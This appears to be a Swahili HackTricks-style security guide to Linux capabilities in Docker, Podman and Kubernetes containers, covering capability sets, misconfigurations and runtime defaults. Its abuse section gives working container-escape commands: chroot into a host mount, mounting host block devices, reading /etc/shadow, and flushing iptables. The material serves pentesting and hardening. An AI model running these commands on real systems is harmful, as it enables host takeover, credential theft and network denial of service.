# Linux Capabilities Katika Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Muhtasari

Linux capabilities ni mojawapo ya sehemu muhimu zaidi za container security kwa sababu yanajibu swali nyeti lakini la msingi: **"root" inamaanisha nini hasa ndani ya container?** Kwenye mfumo wa kawaida wa Linux, UID 0 kihistoria ilimaanisha seti pana sana ya privileges. Kwenye kernels za kisasa, privilege hiyo imegawanywa katika vitengo vidogo vinavyoitwa capabilities. Process inaweza kuendeshwa kama root na bado ikakosa operations nyingi zenye nguvu ikiwa capabilities husika zimeondolewa.

Containers hutegemea tofauti hii kwa kiasi kikubwa. Workloads nyingi bado huzinduliwa kama UID 0 ndani ya container kwa sababu za compatibility au urahisi. Bila capability dropping, hilo lingekuwa hatari sana. Kwa capability dropping, root process iliyo ndani ya container bado inaweza kutekeleza tasks nyingi za kawaida za ndani ya container huku ikizuiwa kufanya operations nyeti zaidi za kernel. Ndiyo maana shell ya container inayoonyesha `uid=0(root)` haimaanishi moja kwa moja "host root" au hata "broad kernel privilege". Capability sets ndizo huamua thamani halisi ya utambulisho huo wa root.

Kwa reference kamili ya Linux capabilities na mifano mingi ya abuse, tazama:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Uendeshaji

Capabilities hufuatiliwa katika sets kadhaa, zikiwemo permitted, effective, inheritable, ambient, na bounding sets. Kwa assessments nyingi za containers, semantics halisi za kernel za kila set si muhimu mara moja kama swali la mwisho la kiutendaji: **ni privileged operations zipi ambazo process hii inaweza kutekeleza kwa mafanikio sasa hivi, na ni privilege gains zipi za baadaye ambazo bado zinawezekana?**

Sababu ya umuhimu huu ni kwamba breakout techniques nyingi kwa kweli ni matatizo ya capabilities yaliyojificha kama matatizo ya containers. Workload yenye `CAP_SYS_ADMIN` inaweza kufikia kiasi kikubwa cha kernel functionality ambacho normal container root process haipaswi kugusa. Workload yenye `CAP_NET_ADMIN` huwa hatari zaidi ikiwa pia inashiriki host network namespace. Workload yenye `CAP_SYS_PTRACE` huwa ya kuvutia zaidi ikiwa inaweza kuona host processes kupitia host PID sharing. Kwenye Docker au Podman hilo linaweza kuonekana kama `--pid=host`; kwenye Kubernetes kwa kawaida huonekana kama `hostPID: true`.

Kwa maneno mengine, capability set haiwezi kutathminiwa peke yake. Inapaswa kusomwa pamoja na namespaces, seccomp, na MAC policy.

## Maabara

Njia ya moja kwa moja ya kukagua capabilities ndani ya container ni:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Unaweza pia kulinganisha container yenye vizuizi zaidi na ile ambayo capabilities zote zimeongezwa:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Ili kuona athari ya nyongeza ndogo, jaribu kuondoa kila kitu kisha kuongeza tena capability moja tu:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Majaribio haya madogo husaidia kuonyesha kwamba runtime haibadilishi tu boolean inayoitwa "privileged". Inaunda uso halisi wa privileges unaopatikana kwa process.

## Capabilities Zenye Hatari Kubwa

Ingawa capabilities nyingi zinaweza kuwa muhimu kulingana na target, chache hujitokeza mara kwa mara katika uchanganuzi wa container escape.

**`CAP_SYS_ADMIN`** ndiyo ambayo defenders wanapaswa kuitazama kwa mashaka makubwa zaidi. Mara nyingi huelezewa kama "the new root" kwa sababu hufungua utendaji mwingi sana, ikiwemo operations zinazohusiana na mounts, tabia zinazoathiriwa na namespaces, na paths nyingi za kernel ambazo hazipaswi kamwe kufichuliwa kiholela kwa containers. Ikiwa container ina `CAP_SYS_ADMIN`, seccomp dhaifu, na hakuna MAC confinement imara, paths nyingi za kawaida za breakout huwa za kweli zaidi.

**`CAP_SYS_PTRACE`** huwa muhimu wakati process visibility inapatikana, hasa ikiwa PID namespace inashirikiwa na host au na workloads nyingine zinazovutia. Inaweza kubadilisha visibility kuwa tampering.

**`CAP_NET_ADMIN`** na **`CAP_NET_RAW`** huwa muhimu katika mazingira yanayolenga network. Kwenye bridge network iliyotengwa, zinaweza tayari kuwa hatari; kwenye shared host network namespace huwa mbaya zaidi kwa sababu workload inaweza kuwa na uwezo wa kureconfigure host networking, kusniff, kuspoof, au kuingilia traffic flows za ndani.

**`CAP_SYS_MODULE`** kwa kawaida huwa janga katika mazingira ya rootful kwa sababu kupakia kernel modules kwa ufanisi kunamaanisha udhibiti wa host-kernel. Karibu kamwe haipaswi kuwepo katika general-purpose container workload.

## Matumizi ya Runtime

Docker, Podman, stacks zinazotegemea containerd, na CRI-O zote hutumia controls za capabilities, lakini defaults na management interfaces hutofautiana. Docker huzionyesha moja kwa moja kupitia flags kama `--cap-drop` na `--cap-add`. Podman hutoa controls zinazofanana na mara nyingi hunufaika na rootless execution kama safety layer ya ziada. Kubernetes huonyesha capability additions na drops kupitia `securityContext` ya Pod au container. System-container environments kama LXC/Incus pia hutegemea capability control, lakini host integration pana ya systems hizo mara nyingi huwafanya operators kulegeza defaults kwa kiwango kikubwa zaidi kuliko ambavyo wangefanya katika app-container environment.

Kanuni hiyo hiyo inatumika kwa zote: capability ambayo inawezekana kitaalamu kupewa si lazima iwe capability inayopaswa kupewa. Incidents nyingi za ulimwengu halisi huanza operator anapoongeza capability kwa sababu workload ilishindwa kufanya kazi chini ya configuration kali zaidi na timu ilihitaji quick fix.

## Misconfigurations

Kosa lililo wazi zaidi ni **`--cap-add=ALL`** katika CLIs za mtindo wa Docker/Podman, lakini si kosa pekee. Kwa vitendo, tatizo linalotokea mara nyingi zaidi ni kutoa capabilities moja au mbili zenye nguvu sana, hasa `CAP_SYS_ADMIN`, ili "kufanya application ifanye kazi" bila kuelewa pia implications za namespace, seccomp, na mount. Failure mode nyingine ya kawaida ni kuchanganya capabilities za ziada na host namespace sharing. Katika Docker au Podman, hii inaweza kuonekana kama `--pid=host`, `--network=host`, au `--userns=host`; katika Kubernetes, exposure inayolingana kwa kawaida huonekana kupitia workload settings kama `hostPID: true` au `hostNetwork: true`. Kila moja ya combinations hizo hubadilisha kile ambacho capability inaweza kweli kuathiri.

Pia ni kawaida kuona administrators wakiamini kwamba kwa sababu workload si `--privileged` kikamilifu, bado ina vikwazo vya maana. Wakati mwingine hilo ni kweli, lakini wakati mwingine effective posture tayari iko karibu vya kutosha na privileged kiasi kwamba tofauti hiyo haibadilishi tena mambo kiutendaji.

## Abuse

Hatua ya kwanza ya kivitendo ni ku-enumerate effective capability set na mara moja kujaribu capability-specific actions ambazo zingekuwa muhimu kwa escape au kupata host information:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Ikiwa `CAP_SYS_ADMIN` ipo, jaribu kwanza matumizi mabaya yanayotegemea mount na ufikiaji wa host filesystem, kwa sababu hii ni mojawapo ya vichocheo vya kawaida vya breakout:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Ikiwa `CAP_SYS_PTRACE` ipo na container inaweza kuona michakato ya kuvutia, thibitisha ikiwa capability hiyo inaweza kutumika kufanya ukaguzi wa michakato:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Ikiwa `CAP_NET_ADMIN` au `CAP_NET_RAW` ipo, jaribu kubaini ikiwa workload inaweza kudhibiti network stack inayoonekana au angalau kukusanya taarifa muhimu za mtandao:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Jaribio la capability linapofaulu, liunganishe na hali ya namespace. Capability inayoonekana kuwa hatari tu katika namespace iliyotengwa inaweza kuwa escape au primitive ya host-recon mara moja wakati container pia inashiriki host PID, host network, au host mounts.

### Mfano Kamili: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Ikiwa container ina `CAP_SYS_ADMIN` na writable bind mount ya filesystem ya host kama vile `/host`, njia ya escape mara nyingi huwa ya moja kwa moja:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Ikiwa `chroot` itafaulu, commands sasa zitatekelezwa katika muktadha wa host root filesystem:
```bash
id
hostname
cat /etc/shadow | head
```
Ikiwa `chroot` haipatikani, mara nyingi matokeo hayo hayo yanaweza kupatikana kwa kuita binary kupitia tree iliyowekwa mount:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Mfano Kamili: `CAP_SYS_ADMIN` + Ufikiaji wa Kifaa

Ikiwa block device kutoka kwa host imewekwa wazi, `CAP_SYS_ADMIN` inaweza kuitumia kupata ufikiaji wa moja kwa moja wa filesystem ya host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Mfano Kamili: `CAP_NET_ADMIN` + Host Networking

Mchanganyiko huu hauleti kila mara host root moja kwa moja, lakini unaweza kusanidi upya kikamilifu stack ya mtandao ya host:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Hilo linaweza kuwezesha denial of service, traffic interception, au access to services ambazo hapo awali zilichujwa.

## Checks

Lengo la capability checks si kutupa tu raw values, bali kuelewa ikiwa process ina privilege ya kutosha kufanya namespace na mount situation yake ya sasa kuwa hatari.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Kinachovutia hapa:

- `capsh --print` ndiyo njia rahisi zaidi ya kutambua capabilities zenye hatari kubwa kama vile `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, au `cap_sys_module`.
- Mstari wa `CapEff` katika `/proc/self/status` unakuambia ni capabilities zipi zinafanya kazi sasa, si zile tu ambazo huenda zinapatikana katika sets nyingine.
- Capability dump huwa muhimu zaidi ikiwa container pia inashiriki host PID, network, au user namespaces, au ina host mounts zinazoweza kuandikwa.

Baada ya kukusanya taarifa ghafi za capabilities, hatua inayofuata ni kuzitafsiri. Uliza ikiwa process ni root, ikiwa user namespaces zinatumika, ikiwa host namespaces zinashirikiwa, ikiwa seccomp inatekelezwa, na ikiwa AppArmor au SELinux bado zinaizuia process. Capability set peke yake ni sehemu tu ya picha nzima, lakini mara nyingi ndiyo sehemu inayoeleza kwa nini container breakout moja inafanya kazi na nyingine inashindwa ikiwa na starting point inayoonekana kuwa ileile.

## Default za Runtime

| Runtime / platform | Hali ya default | Tabia ya default | Kudhoofisha kwa mikono kunakotumika mara nyingi |
| --- | --- | --- | --- |
| Docker Engine | Capability set iliyopunguzwa kwa default | Docker huhifadhi allowlist ya default ya capabilities na kuondoa zilizobaki | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Capability set iliyopunguzwa kwa default | Podman containers kwa default hazina privileges na hutumia capability model iliyopunguzwa | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Hurithi runtime defaults isipobadilishwa | Ikiwa hakuna `securityContext.capabilities` zilizobainishwa, container hupata default capability set kutoka kwa runtime | `securityContext.capabilities.add`, kushindwa kutumia `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O chini ya Kubernetes | Kwa kawaida runtime default | Set inayotumika inategemea runtime pamoja na Pod spec | sawa na safu ya Kubernetes; usanidi wa moja kwa moja wa OCI/CRI unaweza pia kuongeza capabilities waziwazi |

Kwa Kubernetes, jambo muhimu ni kwamba API haifafanui default capability set moja ya jumla. Ikiwa Pod haiongezi au kuondoa capabilities, workload hurithi runtime default ya node hiyo.
{{#include ../../../../banners/hacktricks-training.md}}
